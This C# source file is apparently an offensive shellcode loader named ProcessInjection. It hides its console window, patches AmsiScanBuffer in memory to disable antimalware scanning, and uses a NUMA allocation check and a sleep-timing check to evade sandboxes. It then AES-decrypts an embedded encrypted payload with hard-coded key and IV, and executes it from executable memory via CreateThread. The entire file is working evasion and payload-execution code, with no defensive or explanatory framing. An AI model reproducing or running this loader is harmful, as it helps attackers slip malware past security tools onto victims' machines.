using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static void AmsiPatch()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                return;
            }

            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                return;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero))
            {
                return;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 };    
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);            

            return;
        }

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            AmsiPatch();

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            string finalPayload = "nU6Ww0TENb5eSxxVpHfmV2Ty2jj16yALa2yq214tGScqBUgzoJoa8U2NXdtMlNuuJ/CAJaY4WQ7fudqL8c9vBifhlxeP+mUxKjnehOCzI6RVXKRUjnAv5d4vPws131LlKGU3SQBQ/Hp2GxrWBLprJsDrEIpFT8QgfrNDw/ZQcnknVI6/r9RVF+GVU7hWdVtjZFhOTjPTEwZmHy0KfhQGL8ZEObibPU3Afs79rGQAShyA8wGo62LWWibWs15LKpwemHlze26bim+Uedkgau9eHLDivVO46lL1vnaR/nNLAz2hpacQrxR2ZZOXUs172qRI8audWCbzzbw7Av6+yEApMHIklB13xvndQ5TFHq7UWMaY3umjZGspuLwbcHRIDkh2rbwlsa9f/8bMyILADTvR/wq9uK+eA21bfvFU2MbJKTB2XPZAXrDhRnSnHYhwor2NlWx9kS8bQ66CDIWHYuJYzdGGO+5x8UfQX4etog6r8bI4S6R0cDrOu+uHr764Bfng7jarjQWeBFb/2no7STd2mjDSFKlAG2CQcInq2KKZWuli0+Y1gdycYjGXmpo/qWkVKA7k21q+JmmJxzF2cAuoaOMo4DdwJrTnM/DUWYsEHJ7i4xG02rTWgthnr7xRbubwZVb90AeFhiKIjBIn30RGe4Lx7BXcLujoMq7ofRnRticEVheqK87tMJ438OgjYioXlf2e7Qs3OI2kv6xoaqHuSApaUQBHUMsMdJb7QUjn7PRDHBW5BzjcmItogkTHjPT2EEM3j1d3skrZwxU3VI+r0hVk4vpel02roQ3L0vsJrk8TjsyVCAUaKyv0LX12IfWGGwN9qgWFmkJBD3P+GT4AfnqSNQnlinzJwKX9y5CDAebhv49lZeetna7psG7APi+9WuR+2wwRbcwbU6/m9Qpn4nqWtOhQzDnaU9LC0MNHZBhv/CSsqnjSiKOYAMolQ9UYfmVN/rIPdIQCfTg/cRhqOYbGtGACLKbhWs4VDePJjjo28MwL5B9M/yS+sR1eampN0og7Dw7r7kMmzXyGSR12oYpySpAGo4xqC6oHnXKLBO8DA+jpf7ioth/Qm3klS8dt4tafTbbeMiguVQbS5HvwcFNeLhxoxUsI9RBKehOq2ih92OeA2WVwVR0Aw+Q7jcoUBCEXhH33IfI+b0vJ135F86t0GkOmjw5hN2B4BozbPkcDc3j2V3zsBs76ARfOsrstQBnzJ1TprxQDtiHhh6VGoA==";
            byte[] key = new byte[32] { 0xd7, 0xc4, 0xf5, 0x77, 0x60, 0xf2, 0x51, 0x14, 0x79, 0x6a, 0xa3, 0xea, 0xbf, 0x46, 0xba, 0xfd, 0x02, 0x6f, 0x09, 0x32, 0x08, 0x76, 0xfa, 0x3a, 0x5c, 0x96, 0xab, 0x59, 0x76, 0x00, 0x64, 0x97 };
            byte[] iv = new byte[16] { 0x95, 0xd1, 0xfa, 0x50, 0x4a, 0x56, 0xc2, 0x35, 0x69, 0x32, 0xba, 0xe6, 0x87, 0x1d, 0xd2, 0xf2 };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decrypted_data, 0, addr, decrypted_data.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
